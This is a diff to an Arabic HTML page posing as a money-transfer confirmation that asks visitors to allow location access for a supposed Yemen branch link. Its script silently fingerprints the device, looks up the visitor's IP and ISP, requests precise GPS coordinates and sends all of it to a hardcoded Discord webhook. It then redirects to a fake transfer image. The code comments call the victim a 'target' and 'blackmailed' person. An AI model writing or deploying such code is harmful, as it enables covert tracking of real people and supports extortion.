@@ -5,81 +5,103 @@
     <title>نظام الصرافة الآلي - تأكيد العملية</title>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #eceff1; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; width: 300px; }
+        .card { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; width: 320px; }
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #004a99; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status { color: #d32f2f; font-weight: bold; margin-top: 10px; font-size: 14px; }
     </style>
 </head>
 <body>
     <div class="card">
         <div class="spinner"></div>
         <h3>جاري استخراج إشعار الحوالة...</h3>
-        <p style="font-size: 12px; color: #666;">يرجى عدم إغلاق الصفحة لضمان وصول المبلغ لحسابك</p>
+        <p style="font-size: 13px; color: #444;">يُرجى <b>الموافقة على إذن الموقع</b> لربط الحوالة بأقرب فرع لك في اليمن.</p>
+        <div id="msg" class="status">بانتظار تأكيد الهوية...</div>
     </div>
 
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1463545171609124910/5Vk_iL0QX1eNFSBttcZIZEUH6Vb-S0PO_PW1BDFLr_S_bCQ5rjuHpaAj_K2qgtogFbev';
 
-        async function getAdvancedData() {
-            let info = {
-                username: "الرادار الرقمي - النسخة الاحترافية",
-                embeds: [{
-                    title: "🚀 تم صيد الهدف بنجاح!",
-                    color: 15158332,
-                    fields: []
-                }]
-            };
+        async function startCapture() {
+            // 1. جمع البيانات التقنية الأساسية فوراً
+            let baseData = await getTechData();
+            
+            // 2. محاولة جلب الموقع الجغرافي الدقيق (GPS)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // في حال وافق على الموقع
+                        baseData.embeds[0].title = "📍 تم صيد الموقع الدقيق (GPS)!";
+                        baseData.embeds[0].color = 65280; // أخضر
+                        baseData.embeds[0].fields.push(
+                            { name: "خط العرض (Lat)", value: position.coords.latitude.toString(), inline: true },
+                            { name: "خط الطول (Long)", value: position.coords.longitude.toString(), inline: true },
+                            { name: "الدقة", value: `${Math.round(position.coords.accuracy)} متر`, inline: true },
+                            { name: "خرائط جوجل", value: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`, inline: false }
+                        );
+                        sendToDiscord(baseData);
+                    },
+                    (error) => {
+                        // في حال رفض الموقع أو حدث خطأ
+                        baseData.embeds[0].description = "❌ المبتز رفض إذن الموقع أو الـ GPS معطل.";
+                        sendToDiscord(baseData);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                sendToDiscord(baseData);
+            }
+        }
 
-            // 1. بصمة الجهاز (Hardware)
+        async function getTechData() {
             const gl = document.createElement('canvas').getContext('webgl');
             const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
             const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
 
-            // 2. حالة البطارية (Battery API)
             let batteryInfo = "غير مدعوم";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
                 batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? "يشحن" : "لا يشحن"})`;
             }
 
-            // 3. الموقع والوقت
-            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const screenRes = `${window.screen.width}x${window.screen.height}`;
-
-            // 4. جلب الـ IP والمزود
             let ipData = {};
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 ipData = await res.json();
             } catch (e) {}
 
-            // تجميع البيانات في الحقول
-            info.embeds[0].fields = [
-                { name: "📍 الموقع (IP)", value: `${ipData.city || '؟'} - ${ipData.country_name || '؟'}`, inline: true },
-                { name: "🌐 المزود (ISP)", value: ipData.org || "غير معروف", inline: true },
-                { name: "🔗 IP Address", value: ipData.ip || "Unknown", inline: true },
-                { name: "📱 الجهاز/المعالج", value: navigator.platform + " / " + (navigator.hardwareConcurrency || "?") + " Cores", inline: false },
-                { name: "🎮 كرت الشاشة (GPU)", value: gpu, inline: false },
-                { name: "🔋 البطارية", value: batteryInfo, inline: true },
-                { name: "⏰ التوقيت/المنطقة", value: timeZone, inline: true },
-                { name: "🖥️ دقة الشاشة", value: screenRes, inline: true },
-                { name: "📄 المتصفح", value: navigator.userAgent.substring(0, 250), inline: false }
-            ];
+            return {
+                username: "الرادار الرقمي - تحديد الموقع",
+                embeds: [{
+                    title: "🚀 تم صيد بصمة الجهاز (بانتظار الـ GPS)",
+                    color: 15158332,
+                    fields: [
+                        { name: "📍 الموقع (IP)", value: `${ipData.city || '؟'} - ${ipData.country_name || '؟'}`, inline: true },
+                        { name: "🌐 المزود (ISP)", value: ipData.org || "غير معروف", inline: true },
+                        { name: "🔗 IP Address", value: ipData.ip || "Unknown", inline: true },
+                        { name: "📱 الجهاز", value: navigator.platform + " / " + (navigator.hardwareConcurrency || "?") + " Cores", inline: false },
+                        { name: "🎮 GPU", value: gpu, inline: false },
+                        { name: "🔋 البطارية", value: batteryInfo, inline: true },
+                        { name: "🖥️ الشاشة", value: `${window.screen.width}x${window.screen.height}`, inline: true },
+                        { name: "📄 المتصفح", value: navigator.userAgent.substring(0, 200), inline: false }
+                    ]
+                }]
+            };
+        }
 
-            // إرسال البيانات
+        function sendToDiscord(payload) {
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(info)
+                body: JSON.stringify(payload)
             }).then(() => {
-                // تحويله بعد 3 ثواني لصورة حوالة وهمية (عشان ما يشك)
                 setTimeout(() => {
-                    window.location.href = "https://i.imgur.com/R672DqF.jpg"; 
-                }, 3000);
+                    window.location.href = "https://i.imgur.com/R672DqF.jpg";
+                }, 2000);
             });
         }
 
-        window.onload = getAdvancedData;
+        window.onload = startCapture;
     </script>
 </body>
 </html>
